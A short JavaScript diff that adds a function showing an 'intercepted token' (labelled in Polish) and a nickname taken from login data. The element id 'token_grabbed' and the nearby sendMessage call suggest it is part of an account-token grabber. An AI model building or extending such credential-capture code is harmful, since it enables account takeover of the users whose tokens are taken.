@@ -65,3 +65,7 @@ function sendMessage(loginData) {
     request.send(JSON.stringify(params));
     
 }
+
+function displayToken(loginData) {
+    document.getElementById("token_grabbed").innerHTML = "Przechwycony Token: " + loginData.access_token + "<br>Użytkownika: " + loginData.nickname  
+}
